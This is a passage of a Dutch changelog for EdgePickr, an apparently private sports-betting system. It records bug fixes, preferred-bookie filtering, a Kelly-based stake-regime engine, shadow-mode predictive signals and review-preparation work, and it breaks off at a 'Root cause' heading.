- **Memory file `project_flexibility_constraints.md`**: "best betting tool known to mankind" framing expliciet als *operator aspiration*, niet engineering-claim. Codex referentie toegevoegd.

### Verified at head (b8ad070 / v10.12.25 → nu v10.12.26)
- `.github/workflows/ci.yml` aanwezig (toegevoegd v10.12.5) — niet aanwezig in Codex review-target v10.11.0
- `package.json` exposeert `start`, `test`, `test:coverage`, `audit:high` — 2 extra scripts sinds v10.11.0
- 523 tests groen, 0 npm audit vulnerabilities
- `migrate-to-supabase.js` gearchiveerd in `docs/_archive/` — niet langer op runnable path
- `checkOpenBetResults` passeert `userId` naar `updateBetOutcome` (server.js:10694)

### Acknowledged tech debt — niet gefixt, bewust
- `server.js` ~12.5k regels monoliet (Codex "main structural weakness") — gedocumenteerd in `docs/CODE_REVIEW_PREP.md` §6 als known tech debt. Splitsing is Fase 1 roadmap item, dedicated sprint.
- `index.html` ~5.7k regels inline JS/CSS — zelfde status.
- Globale `user_id = null` semantiek voor operator-alerts in notifications tabel. Werkt voor single-operator, faalt bij multi-user reintroduction. Schema-migratie wanneer relevant.

### Note
De review claim "EdgePickr is now a serious private betting system with a much stronger engineering and product foundation" is accuraat voor v10.11.0 en blijft waar op v10.12.26. De correcties ("niet operatorless", "CI niet zichtbaar in review-target state", "claims moeten eerlijker") zijn allemaal geadresseerd — respectievelijk via language-update, CI pipeline toegevoegd in v10.12.5, en dial-backs deze commit.

## [10.12.25] - 2026-04-17

Code-review prep · P0 race-condition fix + 4 dead-code files deleted + dead-path opgeschoond + reviewer-onboarding doc geschreven. Gedreven door een pre-review audit-agent die concrete findings opleverde.

### Security / correctness fixes

**[P0] `lastPrematchPicks` / `lastLivePicks` race condition** (`server.js:1432-1440` + `lib/config.js:126-135`). Globals werden direct herschreven tijdens lange scans; concurrent `GET /api/picks` kon een half-gevulde array zien. Fix: atomic reference-swap met `Object.freeze([...arr])`. Node.js' single-thread garandeert dat reference-writes atomic zijn, dus readers zien altijd complete prior OR complete new state. Helpers `_atomicSetPrematch` / `_atomicSetLive` in server.js + matching update in `lib/config.js`.

**[P1] `api-sports.js:112` zero-games data-corruptie**. `games.points.for / 1` bij 0-games teams gaf `undefined/1 = NaN` → stille vervuiling van `teamStats`. Fix: expliciete guards (`Math.max(1, rawPlayed)` + `Number.isFinite` checks) + `totalGames` exposed voor downstream "trust this stat?" gates. Eerlijk returnt `null` voor winPct/goalsFor/goalsAgainst als geen games zijn gespeeld.

**[P1] Silent-catch op pre-kickoff + CLV scheduler** (`server.js:8814-8815` + `12173-12176`). `.catch(() => {})` swallowde alle errors → CLV-tracking kon stil falen zonder detectie. Fix: `.catch(e => console.warn(...))` met bet-id context.

### Dead code geruimd (4 files gedelete)

Alle 4 files waren orphaned — **geen enkele andere file importeerde ze** — en hadden volledig gedupliceerde implementaties in `server.js`:

- **`lib/auth.js`** · legacy JWT middleware ZONDER DB-backed status check (de server.js versie heeft dat wél sinds v10.10.22). Veiligheidsrisico als iemand in de toekomst per ongeluk deze versie zou importeren — blocked/demoted users zouden gewoon door komen. Delete.
- **`lib/weather.js`** · `fetchMatchWeather` + `getVenueCoords` zitten identiek in server.js.
- **`lib/api-sports.js`** · enrichmentslogica zit in server.js.
- **`lib/leagues.js`** · `AF_FOOTBALL_LEAGUES` / `NBA_LEAGUES` / etc. alle gedupliceerd in server.js.

Totaal **~700 regels dead code verwijderd**. Code-review oppervlak kleiner. Git-history bevat originele code als ooit nodig.

**Ook gedeprecateerd**: `evaluateKellyAutoStepup()` in server.js teruggebracht tot 2-regel stub (`{stepped: false, reason: 'deprecated_use_stake_regime'}`). Stake-regime engine doet dit nu. Origineel ~90-regel functie-body weg.

### Added
- **[claude] `docs/CODE_REVIEW_PREP.md`** · onboarding-document voor externe reviewers. 10 secties met: wat EdgePickr is, architectuur, doctrine-keuzes die eruit kunnen zien als bugs, scan/stake/learn flows, per-onderwerp startpunten, bekende tech debt (vooraf erkend), hot spots voor reviewer-aandacht, runbook, validation commands, specifieke open vragen voor reviewers.
- **[claude] `docs/REPO_STRUCTURE.md`** bijgewerkt: dode files verwijderd uit indeling, `stake-regime.js` + `walk-forward.js` toegevoegd aan "App/runtime support".

### Not fixed (uit pre-review audit, toegelicht in prep-doc)

- **P1 multi-user scoping op `lastPrematchPicks`** — single-operator doctrine staat dit toe (alleen admin kan scan triggeren). Multi-user scoping is Phase C/D item als dat ooit relevant wordt.
- **P2 `execution-gate` thresholds niet empirisch gevalideerd** — doctrine-vraag die externe reviewer moet beantwoorden (backtest tegen historische CLV).
- **P2 `_scanHistoryCache` invalidation unclear** — bestaand patroon, low risk, upgrade-path ligt vast.
- **P3 Bet365-limit reminder 2026-04-26 hardcoded** — self-cleaning, safe.
- **P3 regime_at_time niet gepersisteerd per bet** — post-hoc regime-cohort analyse vereist schema-update (bets.regime_at_time kolom). Phase C-backlog.

### Tests
- `npm test`: 523 passed, 0 failed.

## [10.12.24] - 2026-04-17

UX batch · huidige-odds refresh op bet-tracker + stake-regime visible in Status page.

### Added — "🔄 Nu" kolom op Bet Tracker
- **[claude] `GET /api/bets/:id/current-odds`** — auth-scoped per user, rate-limited 30/min per user. Leest bet uit supabase (incl. `fixture_id`), fetcht huidige odds via api-sports voor het juiste sport, filtert op user's preferred bookies, zoekt de matchende markt/selectie (via `marketKeyFromBetMarkt`), retourneert `{currentOdds, currentBookie, loggedOdds, loggedBookie, deltaAbs, deltaPct, direction, impliedLogged, impliedCurrent, currentFromPreferred}`. Skipt settled bets (W/L) en bets zonder fixture_id.
- **[claude] UI-kolom "🔄 Nu"** in bet-tracker tabel. Alleen zichtbaar voor open bets. Klik = fetch huidige odds, toont inline: `1.95 ↑ +2.1%` met kleur-codering (groen = gelengd = jouw gelogde odds waren scherper; rood = verkort = te laat). Hover-tooltip toont volledige details. ⚠️ marker als huidige bookie NIET uit preferred is (bv. sharp-ref biedt betere odds dan Bet365/Unibet op dit moment).
- **UI colspan + th update** consistent (van 15 → 16 columns).

### Added — Stake-regime zichtbaar in Status page
- **[claude] `/api/status` returnt nu `stakeRegime`** object: `{regime, kellyFraction, unitMultiplier, reasons}` uit het live `_currentStakeRegime`.
- **[claude] Status-model card toont regime-panel** met:
  - Regime-label (kleur: groen=scale_up, geel=drawdown_soft/shift/streak, rood=drawdown_hard, accent=andere)
  - Kelly-fractie + Unit × multiplier
  - Reasons-string (waarom dit regime)

### Rationale
- Operator vroeg om "huidige odds knop — nice-to-have". Implementatie landt in één plek (bet tracker), geen nieuwe flow nodig.
- Operator ziet in Status welk regime actief is ZONDER admin endpoint te hoeven raadplegen. Ondersteunt "jij scant en logt" doctrine.

### Verwachte bookie-mismatch interpretatie
De ⚠️ marker op current-odds wanneer bookie niet preferred is betekent: de markt heeft bewogen, en op dit moment heeft een sharp-ref (Pinnacle/William Hill) betere odds. Niets om op te reageren — dit is normaal wanneer odds over tijd bewegen. Info-signaal, geen alert.

### UI audit bevindingen (niet-blokkerend)
- `index.html:878/881/912` bevatten historische release-notes die Telegram noemen. Laat staan — v10.4.0 / v10.1.3 releases gebruikten inderdaad Telegram, revisionisme is oneerlijk.
- `index.html:1030` noemt "77 competities" — klopt nog (59 football + 5 basketball + 4 hockey + 3 baseball + 2 NFL + 4 handball = 77).
- `index.html:4946` — telegram-icoon al verwijderd in v10.12.0 (service-map). Niet-stale.

### Tests
- `npm test`: 523 passed, 0 failed.

## [10.12.23] - 2026-04-17

Phase C.10 LIVE-WIRED · Unified stake-regime engine vervangt de aparte `getKellyFraction` + `getDrawdownMultiplier` paden. Volledig automatisch — geen operator-toggle.

### Wat verandert
Bij elke scan-start + bij boot draait `recomputeStakeRegime()`:
1. Leest alle `bets` (uitkomst W/L) uit Supabase
2. Berekent input: `totalSettled`, long-term CLV (200 bet rolling), ROI, recent CLV (30 bet), drawdownPct (peak-based), consecutive L streak, bankroll peak/current
3. Roept `evaluateStakeRegime(input)` aan (v10.12.21 pure engine)
4. Cachet output in `_currentStakeRegime`
5. Sync'd `setKellyFraction(regime.kellyFraction)` zodat `mkP` → `lib/picks.js:125` → `calcKelly()` → `lib/model-math.js:getKellyFraction()` automatisch de regime-waarde gebruikt
6. `getActiveUnitEur()` past `unitMultiplier` toe — picks schalen automatisch mee (kleinere stakes tijdens drawdown_hard, zelfde tijdens standard/scale_up)

### `getDrawdownMultiplier()` gedeprecateerd
Retourneert voortaan `1.0` (regime-engine heeft drawdown al ingebakken in kellyFraction). Voorkomt double-damping: als engine al kelly=0.25 zegt tijdens drawdown_hard, vermenigvuldigen met oude multiplier 0.5 = 0.125 Kelly (te conservatief, halveert zichtbare EV).

### Scan-log toont regime
Elke scan start met: `🎚️ Stake-regime: {regime} · Kelly {x} · unit ×{y}`. Operator ziet direct welk regime actief is zonder admin-endpoint te hoeven raadplegen.

### Safety rails
- **Bounds-check**: als engine kellyFraction buiten [0.10, 0.80] geeft → fallback `kelly=0.35, unit=1.0` + warning-log. Voorkomt dat een bug in engine-logic de stake exploded of kelderdompelt.
- **Transition alert**: web-push bij elke regime-change (exploratory → standard → scale_up / → drawdown_soft etc.). Operator ziet shifts real-time.
- **Recompute-failure tolerantie**: als Supabase query faalt, behoud vorige regime (niet crashen of naar default springen).

### Wat de engine concreet zal doen (voorbeelden)
- 0-50 settled bets: regime `exploratory`, kelly 0.35 (conservatief tot we signaal hebben)
- 200+ settled, CLV +2.5%, ROI +8%: regime `scale_up`, kelly 0.65 (volledige Kelly-utility onder bewezen edge)
- 20% drawdown: regime `drawdown_soft`, kelly 0.40 (bleed stoppen zonder unit te verlagen)
- 30%+ drawdown: regime `drawdown_hard`, kelly 0.25, unit ×0.5 (preserve dry powder)
- 7 L in rij: regime `consecutive_l`, kelly 0.35, unit ×0.75
- Recent CLV -1% + long-term +2% + delta ≥2pp: regime `regime_shift` (edge-regime-shift), kelly 0.40

### Stake-decision volledig geautomatiseerd — operator blijft buiten deze loop
Stake-sizing (Kelly-fraction + unit-multiplier) is nu algoritmisch bepaald; er is geen operator-toggle om per scan te tunen. Andere operator-verantwoordelijkheden blijven bestaan (bet-outcomes loggen, preferredBookies kiezen, scan-schedule, 2FA, manual scan-trigger). Admin endpoint `/api/admin/v2/stake-regime` is inspection-only — toont decision maar kan het niet override. (Eerlijke framing: EdgePickr is een *highly automated operator-driven* systeem, niet operatorless — zie Codex review 2026-04-17.)

### Tests
- `npm test`: 523 passed, 0 failed (geen wijzigingen aan test-suite nodig; bestaande tests dekken engine output + integration via indirect Kelly-check).

### Deprecated
- `evaluateKellyAutoStepup` is nu redundant — engine doet dit via `scale_up` regime. Laat function staan voor backwards-compat (nog bereikbaar via `/api/admin/v2/auto-stepup`) maar operator gebruikt 'm niet meer.

## [10.12.22] - 2026-04-17

Vervolg preferred-bookie lek audit · DNB + Double Chance + Handicap gefixt. Complementeert v10.12.20.

### Root cause recap
`filteredBks` in football scan bevat `Pinnacle` + `William Hill` als sharp-refs voor consensus-truth. Meerdere pick-paden gebruikten die zonder preferred-filter → non-preferred bookies lekten naar pick.bookie. v10.12.20 loste BTTS + analyseTotal op. Deze commit vervolgt:

### Gefixt in deze commit
1. **`server.js:6165+` DNB block** — bestDnbH / bestDnbA loop filtert nu op `getPreferredBookies()`. Zelfde pattern als BTTS (v10.12.20).
2. **`server.js:6228+` Double Chance block** — bestHX / best12 / bestX2 manual loops krijgen preferred filter.
3. **`server.js:6268+` Handicap block** — `bookies.slice(0, 3)` nam willekeurige eerste 3 uit de pool (vaak Pinnacle + William Hill aan de top). Nu: eerst filter op preferred, dan slice.

### Preferred-compliance status (football markten)
| Markt | Status |
|-------|--------|
| 1X2 ML | ✅ via `bestOdds` (al gated) |
| O/U Totals 2.5 | ✅ v10.12.20 analyseTotal |
| BTTS | ✅ v10.12.20 |
| DNB | ✅ v10.12.22 |
| Double Chance 1X/12/X2 | ✅ v10.12.22 |
| Asian Handicap (spreads) | ✅ v10.12.22 |
| Odd/Even (hockey — uses bestFromArr) | ✅ al gated |
| Team Totals | ✅ via `bestFromArr` |

Alle football pick-paden landen nu op operator's preferred bookies. Als geen preferred bookie het markt biedt → pick surfacet niet (consistent met 1X2 gedrag).

### Modal mystery
Wacht nog op screenshot van modal-renderer voor de "Bet365 in modal, Unibet op card, William Hill in reason" discrepantie. Zonder dat kan ik niet pinpointen waar modal zijn bookie-label vandaan haalt.

### Tests
- `npm test`: 523 passed, 0 failed.

## [10.12.21] - 2026-04-17

Phase C.10 · Unified stake-regime engine (observability-mode). Grootste stake-logica update sinds `unit_at_time`, maar nog NIET verbonden met live stake-flow — eerst valideren via admin endpoint.

### Added
- **[claude] `lib/stake-regime.js`** — pure function `evaluateStakeRegime(input)`. Input: `{totalSettled, longTermClvPct, longTermRoi, recentClvPct, drawdownPct, consecutiveLosses, bankrollPeak, currentBankroll}`. Output: `{regime, kellyFraction, unitMultiplier, reasons[]}`.
- **7 regimes** met priority order:
  1. `drawdown_hard` (≥30% drawdown) → kelly 0.25, unit ×0.5
  2. `drawdown_soft` (≥20% drawdown) → kelly 0.40, unit ×1.0
  3. `consecutive_l` (≥7 L in a row) → kelly 0.35, unit ×0.75
  4. `regime_shift` (long-term +, recent - ≥ 2pp delta) → kelly 0.40, unit ×1.0
  5. `exploratory` (<50 settled) → kelly 0.35, unit ×1.0
  6. `scale_up` (200+ settled, CLV ≥2%, ROI ≥5%) → kelly 0.65, unit ×1.0
  7. `standard` (100+ settled, CLV > 0%) → kelly 0.50, unit ×1.0
- **[claude] `GET /api/admin/v2/stake-regime`** — observability endpoint. Berekent huidige input uit live `bets` tabel en toont wat de engine ZOU beslissen. Returnt input + decision + reasons. Nog niet verbonden met runtime.
- **11 unit tests** voor transitie-boundaries + priority-order.

### Waarom nog niet live-wired
De huidige `getKellyFraction()` + `getDrawdownMultiplier()` + manual unitEur gedragen zich gecalibreerd over tijd. Directe replace = stake-schok. Doctrine §5 "kleine production-safe diffs": eerst 1-2 weken vergelijken "huidige kelly × drawdown" vs "stake-regime engine output" via admin endpoint. Als output matcht binnen tolerantie, migreren. Als output afwijkt, debug + tune.

Het engine is ontworpen om de bestaande layers te VERVANGEN, niet aan te vullen — dat voorkomt double-dampening (drawdown layer × engine = overkill).

### Doctrine-commitments in deze engine
- **Conservatief bias**: step-ups vereisen SAMEN bewijs (CLV ≥2% AND ROI ≥5% AND ≥200 samples). Step-downs fireren op één sterk signaal (één van drawdown / L-streak / regime-shift).
- **Unit-multiplier is runtime-transient**, niet config. Voorkomt "stap-down wist config, step-up onthoudt config" valkuil.
- **Priority order is expliciet**: scale_up wint NOOIT van drawdown_hard. Drawdown komt eerst.

### Follow-up (next sprints)
- Historical-replay validatie: run engine tegen alle oude bets, vergelijk met werkelijk gebruikte kelly × drawdown-mult. Als delta klein → wiring safe.
- Live-wiring achter operator toggle (opt-in).
- Alert op regime transitions (web-push when regime changes).
- Per-sport regime (momenteel global).

### Tests
- `npm test`: 523 passed, 0 failed (11 nieuwe + bestaande).

## [10.12.20] - 2026-04-17

Fix · Preferred-bookie lek in football pick-odds voor BTTS + O/U totals. Verklaart waarom operator's pick-cards occasioneel "William Hill" of "Pinnacle" toonden terwijl `preferredBookies = [Bet365, Unibet]`.

### Root cause
Line 5569-5573 in `runPrematch` voegt `pinnacle` + `william hill` toe aan `filteredBks` voor **consensus-berekening** (sharp-reference probabilities). Dat is correct — fair-prob consensus hoort sharp-books te includeren. MAAR: de BTTS + O/U pick-odds code deed een eigen max-price loop over `filteredBks` / `bookies` ZONDER preferred-filter → non-preferred bookies lekten door naar `pick.bookie`.

### Gefixt in
1. **`server.js:6020+` (BTTS block)** — `bttsBk` loop filtert nu eerst op `getPreferredBookies()` voordat best-price wordt gekozen. Non-preferred bookies blijven bijdragen aan consensus-model (indirect via fairProbs) maar nooit meer aan de pick-badge.
2. **`lib/picks.js:218 analyseTotal()`** — zelfde patroon als BTTS. `avgIP` (consensus) berekend over FULL pool, `best` (execution) alleen op preferred. Behoudde backward-compat: als operator geen preferredBookies heeft ingesteld → fallback naar alle bookies (safety net).
3. **`lib/odds-parser.js`** — nieuwe export `getPreferredBookiesLower()` voor lib/picks.js gebruik.

### Andere markten check
- **1X2 ML (football)**: gebruikt `bestOdds()` → `bestFromArr()` → respects preferred already (`requirePreferred: true` default). GOED.
- **DNB (football)**: gebruikt `bestFromArr()` → preferred respecteerd. GOED.
- **Asian Handicap (football)**: gebruikt `bestSpreadPick()` → let me audit next sprint.
- **BTTS (football)**: GEFIXT deze commit.
- **O/U totals (football)**: GEFIXT via analyseTotal.
- **Hockey/baseball/basketball/NFL/handball**: gebruiken overwegend `bestFromArr()` of `analyseTotal()` — laatste is nu gefixt.

### Impact
Na deze deploy:
- BTTS picks tonen alleen Bet365 of Unibet als bookie (binnen operator's preferred set)
- O/U 2.5 picks tonen alleen preferred bookies
- De K-League BTTS pick die eerder "William Hill" liet zien zou nu NIET surface als geen preferred bookie het markt heeft (voorheen surfacede het met de sharp-ref prijs)

### Follow-up
- Asian Handicap / spread codepaden audit (volgende sprint)
- Modal-renderer mystery (waar Bart "Bet365" zag) — nog niet opgelost zonder screenshot

### Tests
- `npm test`: 512 passed, 0 failed.

## [10.12.19] - 2026-04-17

Hotfix · `marketFairHb is not defined` in handbal scan. Zelfde type scope-bug als de v10.12.13 `f5Diag` fix.

### Bug
`server.js:5243` (`snap.writeFeatureSnapshot`) gebruikte `marketFairHb?.home/draw/away`, maar `marketFairHb` werd op line 5219 gedeclareerd INSIDE `if (parsed.threeWay && parsed.threeWay.length) {}` block (lines 5198-5237). Als die `if` doorging kwam de variabele buiten scope bij line 5243 → `ReferenceError` die gehele handball-loop catche stopte.

Live scan 14:00 toonde: `⚠️ 🤾 Starligue (Frankrijk): marketFairHb is not defined`.

### Fix
`let marketFairHb = null;` verplaatst buiten het if-block (op de buiten-scope). Assignment blijft binnen de if. Alle downstream gebruiken (`marketFairHb?.home` etc.) zijn al optional-chaining, dus null is veilig.

### Regression-check
Hockey-scan heeft hetzelfde 3-way Poisson patroon maar gebruikt `marketFairReg` die al op buiten-scope zit (line 3483) — geen bug. Alleen handbal had de scope-issue.

### Operational impact
- Voor v10.12.19: handbal-scan verloor de hele try-iteratie voor elke Starligue/Bundesliga/etc league met 3-way odds. 0 handbal picks.
- Na v10.12.19: feature_snapshot schrijft + ML scoring werkt weer schoon.

### Tests
- `npm test`: 512 passed, 0 failed.

## [10.12.18] - 2026-04-17

UI-fix · pick-card bookie-badge toont nu de werkelijke bookie-naam i.p.v. te liegen.

### Bug (pre-existing, gemeld door operator)
`index.html:1544` had een hardcoded ternary:
```js
${p.bookie.toLowerCase().includes('bet365') ? 'Bet365' : 'Unibet'}
```
Elke pick waarvan de werkelijke best-price-bookie **niet** Bet365 was, werd in de badge gelabeld als "Unibet" — ongeacht of het William Hill, Pinnacle, Bet365's bookie X, enzovoorts was. Operator zag bijvoorbeeld een K-League BTTS pick waarbij:
- Pick-card badge: "Unibet"
- Reason-tekst in dezelfde card: "William Hill: 2"
- Modal: "Bet365"
3 verschillende bookie-labels op dezelfde pick.

### Fix
- **[claude] UI badge toont nu `p.bookie` direct** via `escHtml(p.bookie)`.
- **Kleur-codering** op preferred-status:
  - Bet365 → groen
  - Unibet → blauw
  - Andere bookies uit `userSettings.preferredBookies` → paars
  - Non-preferred (scan vond betere odds buiten jouw set) → **oranje** = waarschuwing dat dit niet jouw gewoonlijke bookie is
- `title` attribute = full bookie name (voor hover tooltip).
- `escHtml()` toegepast — bookie-string is server-gegenereerd maar defense-in-depth.

### Follow-up onderzoek nodig (niet in deze commit)
Dat de scan een "William Hill" pick produceerde is op zich een vraagpunt: operator's preferred bookies zijn `[Bet365, Unibet]`, dus execution zou daar moeten landen. Mogelijke oorzaken:
1. **Preferred-filter niet actief** op dat codepad — `setPreferredBookies` race
2. **Fallback gedrag** als geen preferred-bookie een competitieve prijs heeft — ga naar "best overall"
3. **`bestFromArr` negeert preferred filter** in bepaalde kart-types

Dit is een aparte bug/doctrine-vraag — opname in next sprint. Voor nu toont de UI de waarheid zodat operator niet meer mis-informatie krijgt.

### Modal-mismatch onderzoek
Bart meldde dat modal "Bet365" toonde voor dezelfde pick die in de badge "Unibet" zei. Als pick.bookie = "William Hill" kan modal geen "Bet365" tonen zonder zelf ook een hardcoded fallback te hebben. Vraagt aparte trace in next session.

### Tests
- `npm test`: 512 passed, 0 failed.

## [10.12.17] - 2026-04-17

Phase D.13b · Lineup-certainty shadow signal voor football. Complementair met fixture-congestion (v10.12.14).

### Added
- **[claude] `lineupCertainty` state variable** in football scan, gezet tijdens bestaande `/fixtures/lineups` fetch. 5 states:
  - `'both'` — beide teams confirmed (≥9 startXI spelers)
  - `'home_only'` / `'away_only'` — één team confirmed, ander nog niet
  - `'neither'` — lineup-fetch draaide maar geen teams confirmed
  - `'too_early'` — meer dan 3u tot kickoff (lineup-fetch geskipt)
  - `'unknown'` — edge case
- **[claude] 5 shadow-mode signalen** in `buildSignals()`:
  - `lineup_confirmed_both:0%`
  - `lineup_confirmed_home_only:0%`
  - `lineup_confirmed_away_only:0%`
  - `lineup_pending:0%`
  - `lineup_too_early:0%`

### Geen extra API calls
De `/fixtures/lineups` fetch draait al (lines 5622-5637). Deze commit voegt alleen state-extractie + shadow-signal-push toe. Zero API-overhead.

### Hypothese (te valideren via auto-promote)
Picks gemaakt wanneer beide teams `confirmed` zijn moeten hogere CLV hebben dan `too_early` picks — omdat de markt al ingeprijsd heeft op bekende lineups, en ons model met dezelfde informatie werkt. Als data dit confirmeert, promoveert `lineup_confirmed_both` naar weight=0.5 automatisch via `autoTuneSignalsByClv` (v10.12.3 Brier-drift gates + v10.12.11 BH-FDR gates zorgen dat deze promotie defensief is).

Omgekeerd: als `lineup_too_early` structureel betere CLV laat zien, is dat ook leerzaam — waarschijnlijk omdat markt nog niet efficient ingeprijsd heeft.

### Tests
- `npm test`: 512 passed, 0 failed. (Pure signal attribution — test coverage komt via de integration-test in Phase E.22.)

### Naming
`lineup_confirmed_both/home_only/away_only/pending/too_early` als afzonderlijke signal-keys i.p.v. één signal met value-field. Dit is consistent met hoe knockout signals (`knockout_1st_leg:0%`, `knockout_2nd_leg:0%`) worden bijgehouden — elke state is een eigen proxy die autotune apart kan wegen.

## [10.12.16] - 2026-04-17

Phase C.9 · Per-bookie volume-concentration watcher. Sluit het grootste onopgeloste operator-survivability risico uit de audit (§14.R2.E "survival > peak EV").

### Added
- **[claude] `computeBookieConcentration(bets, windowDays, nowMs)`** — pure helper. Parseert `bets.datum` (dd-mm-yyyy), telt stake per bookie over last N dagen, returnt `{total, perBookie[{bookie, stake, share}], maxShare, maxBookie}`. Sort desc by share.
- **[claude] `runBookieConcentrationCheck()`** — scheduled watcher. Queryt alle bets, berekent 7d concentratie. Fireert web-push alert als `maxShare > 60%` EN `total > €50` (drempel tegen triviaal-volume false positives). De-spam: max 1 alert per 24u.
- **[claude] `scheduleBookieConcentrationWatcher()`** — boot + 1u delay, daarna elke 6u.
- **[claude] `GET /api/admin/v2/bookie-concentration?days=7`** (requireAdmin) — exposed helper voor on-demand inspection. Returnt ranking + `aboveThreshold` flag.

### Waarom
Soft-book closure bij concentratie is voor een private operator het grootste unmitigated loss-vector (van audit): bookie ziet hoge winst/volume uit één richting, limiet omlaag of account dicht. Zonder tracking merkt operator het pas na het feit. Nu: proactive alert bij 60% concentratie, ruim vóór het closure-punt.

### Alert-shape
```
🏦 BOOKIE CONCENTRATIE HOOG
Bet365: 73% van €240 7d volume.
Spreid risico vóór soft-book limits/closure.
bet365 73% (€175) · unibet 18% (€43) · pinnacle 9% (€22)
```

### Rationale voor 60% threshold
- 50% = grens tussen majority + minority. Twee bookies 50/50 is geen concentratie-risico.
- 70% = een boek pakt 2/3 van alle volume, al een duidelijk patroon.
- 60% = middenweg: vroeg genoeg om te diversifiëren, laat genoeg om false positives te voorkomen. Kan later per operator-setting configureerbaar als data dat vereist.

### Non-goals
- **Automatische bookie-priority degradatie** (next sprint). Nu alleen alert; operator kiest zelf actie. Automatische "geen Bet365 picks meer tot share < 40%" logica vereist interactie met `setPreferredBookies` en bookie-filter; eigen slice.
- **Per-sport breakdown** (volgende slice). Nu aggregated over alle sporten.

### Tests
- 5 nieuwe unit tests voor `computeBookieConcentration`.
- `npm test`: 512 passed, 0 failed.

## [10.12.15] - 2026-04-17

Phase B.8 · Scheduled autotune. `autoTuneSignalsByClv` was manual-only; nu draait het autonoom elke 6 uur met een sample-size gate + sanity-rail alert.

### Added
- **[claude] `scheduleAutotune()`** — setTimeout 4h na boot, daarna `setInterval` elke 6u. Roept `runScheduledAutotune()` aan.
- **[claude] `runScheduledAutotune()`** logic:
  1. Query actuele settled-bet count (W/L).
  2. Eerste run: altijd door. Daarna: alleen als `currentSettled - lastSettled >= 20`. Voorkomt dat tuning op identieke data draait en ruis creëert.
  3. Draait `autoTuneSignalsByClv()` (die zelf al FDR + Brier-drift gates toepast uit v10.12.3/v10.12.11).
  4. **Sanity-rail**: als ≥1 signaal zijn weight met **≥10% absolute** wijzigt → web-push alert `🧠 AUTOTUNE LARGE CHANGE` met top 3 changes.
  5. **Info-log**: elke succesvolle run schrijft een `type='autotune_run'` rij in `notifications` (voor audit-trail: wanneer gedraaid, wat geadjusteerd, welke muted/drift/fdr counts).
- **`scheduleAutotune()` opgenomen in de boot-sequence** naast `scheduleAutoRetraining`, `scheduleHealthAlerts`, etc.

### Safe-ups
- Failure-mode: in-memory tracking van `_lastAutotuneSettledCount`. Bij app-restart verliezen we de vorige count → eerste run na restart fireert sowieso. Geen disaster, want `autoTuneSignalsByClv` heeft eigen minimum-N gates (30 CLV-bets, 20 per signal).
- Alert-spam: alleen als verandering ≥10% absolute. Typische adjustments zijn 2-5% → geen alert. Drift-mute + auto-promote zijn per definitie groot → wel alert, correct.

### Rationale
Met v10.12.11 FDR-correctie is autotune defensief genoeg om zelf te draaien zonder operator-bewakingswerk. De learn-lus is nu gesloten: settled bets → CLV + Brier → autotune → weight updates → volgende scan gebruikt nieuwe weights. Doctrine §3 Learn + §5 Fase 5 ("minder handwerk").

### Tests
- `npm test`: 507 passed, 0 failed. (Pure-interval logica; integration via live scan valideert.)

## [10.12.14] - 2026-04-17

Phase D.13 · Fixture-congestion signal voor football (shadow-mode). Eerste nieuwe signal die via de signal-promotion doctrine (shadow → active bij walk-forward bewijs) binnenkomt.

### Added
- **[claude] `fetchLastPlayedDate`** haalt nu `last=3` i.p.v. `last=1` per team (zelfde API-call kost, 3× data terug). Recente dates cachen in `afCache.recentMatches[sport][teamId]`.
- **[claude] `getRecentMatchDates(sport, teamId)`** — read-helper voor de recente-matches cache.
- **[claude] `computeFixtureCongestion(recentDates, kickoffMs, windowDays=7)`** — pure helper. Telt matches in de laatste N dagen vóór kickoff. Returnt `{count, congested, densityDays}`. `congested = count >= 3`.
- **[claude] `buildRestDaysInfo(..., opts)`** — accepteert nu optionele 5e arg `{homeRecentDates, awayRecentDates}`. Berekent congestion per team + genereert shadow-mode signals.

### Nieuwe signalen (allemaal weight=0 default — shadow-mode)
- **`fixture_congestion_home_tired:0%`** — thuisteam ≥3 wedstrijden in last 7d
- **`fixture_congestion_away_tired:0%`** — uitteam ≥3 wedstrijden in last 7d
- **`congestion_mismatch_home_advantage:0%`** — alleen uitteam congested → thuis voordeel
- **`congestion_mismatch_away_advantage:0%`** — alleen thuisteam congested → uit voordeel

### Note in scan-log
Nieuwe human-readable regel naast bestaande rust-note: `📅 congestion 7d: thuis 2 / uit 3🔥` (🔥 marker op congested teams).

### Shadow → active mechanisme
Doctrine `project_signal_promotion_doctrine.md` (2026-04-17): nieuwe signals ship in shadow (weight=0, no scoring impact), worden wel per pick geattribueerd in `signals[]` array, en auto-promoten via `autoTuneSignalsByClv` zodra:
- n ≥ 50 picks met dat signal
- edge CLV ≥ 0.75%
- raw avg CLV > 0
- Brier drift < 0.03
- **(v10.12.11) BH-FDR q=0.10 pass**

Dat betekent: de 4 nieuwe fixture_congestion signals beïnvloeden NU geen stake. Zodra we na 50+ picks bewijs hebben dat ze CLV-positief zijn, promoveren ze automatisch naar weight=0.5.

### Telemetrie
`scanTelemetry.fixtureCongestionHome` + `fixtureCongestionAway` counters bijgewerkt per scan (zichtbaar in scan-log signal coverage regel).

### Waarom fixture-congestion eerst
Uit research-audit: "Football fixture-congestion: hoogste signal:effort ratio (1-2h effort, 2-3% edge op midweek fixtures)." Bestaande `restDays` signal dekt "days since last match" maar niet de bredere density. Een team dat 3 wedstrijden in 6 dagen heeft gedraaid (bv. league + cup + Europa + league) heeft andere fatigue-profile dan een team dat 6 dagen rust had na 1 match.

### Tests
- 6 nieuwe unit tests voor `computeFixtureCongestion`.
- `npm test`: 507 passed, 0 failed.

### Queue
Volgende signalen (ook shadow-mode):
- Lineup certainty (via `/fixtures/lineups` gecachte data)
- Rotation risk (op basis van minutes-played vs squad-depth)
- Ander sport: NFL inactives + stadium/weather

## [10.12.13] - 2026-04-17

Hotfix · `f5Diag is not defined` in MLB + KBO scans. Bug zichtbaar als `⚠️ ⚾ MLB: f5Diag is not defined` + `⚠️ ⚾ KBO (Korea): f5Diag is not defined` in de eerste live scan-log na v10.12.12 merge.

### Fixed
- **[claude] MLB scan `f5Diag` scope bug** (`server.js:4389`). De per-match F5 diagnostiek-log `if (f5Diag.length) emit({log: …})` stond BUITEN de `for (const g of games)` game-loop, maar `f5Diag` wordt INSIDE de loop declared (line 4320). Resultaat: elke iteratie van de league-loop crashte bij het raken van die regel met `ReferenceError: f5Diag is not defined`, de try-catch ving het op en logde de error. MLB + KBO (die de MLB scan-functie delen) logden allebei de error en stopten hun F5-diagnostiek output — maar de ML-scoring eerder in de loop draaide wel door (vandaar de 1 MLB baseball pick in de scan, met correct functionerende execution-gate).

### Root cause
